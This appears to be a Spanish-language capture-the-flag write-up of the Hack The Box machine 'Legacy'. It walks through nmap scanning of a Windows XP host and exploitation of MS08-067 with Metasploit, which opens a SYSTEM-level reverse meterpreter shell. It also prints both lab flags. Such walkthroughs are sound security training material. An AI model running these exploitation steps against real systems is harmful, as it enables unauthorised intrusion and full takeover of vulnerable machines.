---
title: Legacy WriteUp
date: 2024-02-07
categories: [WriteUps, Máquinas Windows]
tags: [nmap, SMB, Metaexploit]
image:
  path: ../../assets/img/writeups/Legacy/legacy.png
  width: 528
  height: 340
  alt: Banner Legacy
---

Estamos ante un sistema operativo antiguo, Windows XP, y el servicio smb abierto. Había dos vulnerabilidades posibles, escogemos la vulnerabilidad ms08-067, conocida como el gusano Conflicker. Para explotarlo uso metaexploit. Para un método más manual recomiendo usar algún otro script disponible por internet.

## Reconocimiento

Máquina **Legacy**, la primera máquina Windows que voy a realizar. Empezeremos como en el resto de máquinas, comprobando que tenemos conectividad (entiendo que nos hemos conectado a la VPN y hemos spawneado la máquina Legacy).

```sh
❯ ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=42.2 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.234/42.234/42.234/0.000 ms
```

Tenemos conectividad a la máquina, realizaremos un escaneo de puertos:

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oN ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-07 16:56 CET
Initiating SYN Stealth Scan at 16:56
Scanning 10.10.10.4 [65535 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 135/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Completed SYN Stealth Scan at 16:56, 13.63s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.041s latency).
Scanned at 2024-02-07 16:56:32 CET for 14s
Not shown: 61914 closed tcp ports (reset), 3618 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds
           Raw packets sent: 73308 (3.226MB) | Rcvd: 61917 (2.477MB)
```

Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.4 : Dirección IP objetivo, la cual quiero escanear
* -oN : Exportar al fichero en formato "Normal".

Ahora realizaré un escaneo más profundo de esos puertos descubiertos; 135, 139 y 445.

```sh
❯ nmap -p135,139,445 -sC -sV 10.10.10.4 -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-07 17:00 CET
Nmap scan report for 10.10.10.4
Host is up (0.040s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-02-12T19:57:56+02:00
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b93641 (VMware)
|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m51s, median: 4d23h57m39s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds
```

Parece que quizás pueda entrar al servicio smb (server message block) con el usuario **guest** (invitado).  
En un principio ni `smbmap` ni `smbclient` nos permiten conectarnos sin autorización:

```sh
❯ smbmap -H 10.10.10.4
[+] IP: 10.10.10.4:445	Name: 10.10.10.4                                        
❯ smbclient -N -L //10.10.10.4
session setup failed: NT_STATUS_INVALID_PARAMETER
```

> Nota: Estoy fijandome en como lo ha hecho **0xdf**, lo explica muy bien, me gusta como lo hace.

## Buscando vulnerabilidades

Estamos ante un Windows XP, deduzco que tendrá vulnerabilidades. El servicio smb está abierto. Haré una búsqueda de scripts de nmap, hay un módulo en HTB Academy que explica el uso de nmap - será mi próximo módulo a estudiar -.

```sh
❯ ls /usr/share/nmap/scripts | grep smb | grep vuln
smb-vuln-conficker.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-cve2009-3103.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
smb2-vuln-uptime.nse
```

Esto lo hago sobretodo porque es un sistema operativo antiguo, y hay más posibilidades de que encontremos algo con scritps de nmap.  
Correré el siguiente comando para analizar si tiene alguna de esas vulnerabilidades:

```sh
❯ nmap --script smb-vuln\* -p 445 -oN smbvulns 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-07 17:41 CET
Nmap scan report for 10.10.10.4
Host is up (0.041s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 5.39 seconds
```

Parece que tengo dos vulnerabilidades que me permitirían ejecutar código en la máquina.

## Explotación

Usaré metaexploit para la vulnerabilidad ms08-067. Primero veamos si se encuentra disponible. Filtraré por la **cve** que veo por arriba:

```sh
❯ searchsploit --cve '2008-4250'
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)                                                                                 | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                                                                                                  | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                                                                            | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)                                                             | windows/remote/16362.rb
```

Tiene que ser el cuarto. Entro en la consola de metaexploit.

```sh
❯ msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.3.5-dev                           ]
+ -- --=[ 2296 exploits - 1202 auxiliary - 410 post       ]
+ -- --=[ 965 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Display the Framework log using the 
log command, learn more with help log
Metasploit Documentation: https://docs.metasploit.com/

[msf](Jobs:0 Agents:0) >> search cve:2008-4250

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.136    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set LHOST 10.10.14.17
LHOST => 10.10.14.17
```

Con todo configurada lanzamos el comando `exploit` propio de metaexploit:

```sh
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.4:1032) at 2024-02-07 18:00:51 +0100

(Meterpreter 1)(C:\WINDOWS\system32) > help

# Uso help para averiguar que comandos puedo usar
```

Soy el usuario con más privilegios; **NT AUTHORIRY\SYSTEM**.

```sh
(Meterpreter 1)(C:\WINDOWS\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

Encuentro la primera flag en la ruta que se puede ver en el siguiente bloque:

```sh
(Meterpreter 1)(C:\Documents and Settings\john) > cd Desktop\\
(Meterpreter 1)(C:\Documents and Settings\john\Desktop) > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 07:19:49 +0100  user.txt

(Meterpreter 1)(C:\Documents and Settings\john\Desktop) > cat user.txt
e69af0e4f443de7e36876fda4ec7644f
```
Y por aquí la segunda flag, del usuario Administrator:

```sh
(Meterpreter 1)(C:\Documents and Settings\Administrator\Desktop) > cat root.txt
993442d258b0e0ec917cae9e695d5713
```

